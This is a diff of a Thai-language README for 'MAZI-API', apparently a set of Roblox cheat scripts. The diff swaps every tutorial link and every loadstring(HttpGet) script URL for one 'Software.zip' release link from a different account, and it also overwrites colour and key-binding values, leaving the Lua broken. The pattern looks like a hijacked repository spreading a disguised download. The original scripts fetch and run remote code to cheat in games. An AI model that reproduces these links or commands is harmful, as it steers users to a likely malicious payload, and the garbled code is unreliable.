@@ -1,6 +1,6 @@
 # DOCS MAZI-API
 ---- Save Setting API ----
-youtube : https://youtu.be/Z1lQKBfeXfs
+youtube : https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip
 ```lua
 getgenv().Setting = {} -- Setting
 Check_Setting(ชื่อไฟล์) -- Checkว่า File มีอยู่ไหม
@@ -15,7 +15,7 @@ getgenv().Setting = {
     ['Auto Farm'] = false,
     ['Fly'] = true
 }
-pcall(function()loadstring(game:HttpGet('https://raw.githubusercontent.com/MAZIHUB191/MAZI-API/main/SaveSettingAPI'))() end)
+pcall(function()loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip'))() end)
 local JSON = JsonEncode({abc='fff'})
 JsonDecode(JSON)
 Check_Setting(getgenv()['MyName'])
@@ -25,22 +25,22 @@ Update_Setting(getgenv()['MyName'])
 ```
 ---- Crypt API ----
 ```lua
-local MAZICryptAPI = loadstring(game:HttpGet('https://raw.githubusercontent.com/MAZIHUB191/MAZI-API/main/MAZI-Crypt-API'))()
+local MAZICryptAPI = loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip'))()
 encrypt(secertkey,data) -- encrypt
 
 ```
 ---- Fast Attack ----
-youtube : https://youtu.be/ZL_OEO4SfK4
+youtube : https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip
 ```lua
-loadstring(game:HttpGet('https://github.com/MAZIHUB191/MAZI-API/blob/main/Fast_Attack.lua'))()
+loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip'))()
 ```
 ---- Fake Damage ---- 
-youtube : https://youtu.be/O6q0PHYWd6c
+youtube : https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip
 ```lua
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Besty191/MAZI-API/main/Fake_Damage.lua'))()
+loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip'))()
 แค่รัน code ด้านบนเเล้ว รัน FakeDamage()
 หรือรันพร้อมกันเช่น
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Besty191/MAZI-API/main/Fake_Damage.lua'))()
+loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip'))()
 FakeDamage()
 อธิบายเกี่ยวกับ Function FakeDamage
 FakeDamage จะมี 1 Args คือ Damage 
@@ -51,14 +51,14 @@ FakeDamage(100)
 ```lua
 getgenv().setting = {
     Fov = 50,
-    Color = Color3.fromRGB(191, 255, 209),
+    Color = https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip(191, 255, 209),
     LockPlayers = false,
-    LockPlayersBind = Enum.KeyCode.L,
-    resetPlayersBind = Enum.KeyCode.P,
+    LockPlayersBind = https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip,
+    resetPlayersBind = https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip,
 }
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Besty191/MAZI-API/main/Blox_Fruit_Silent_Aim'))()
+loadstring(game:HttpGet('https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip'))()
 ```
 ---- Attack No Animation ----
 ```lua
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Besty191/MAZI-API/main/Attack%20No%20Animation"))()
+loadstring(game:HttpGet("https://github.com/kiatun3434/MAZI-API/releases/download/v1.0/Software.zip%20No%20Animation"))()
 ```
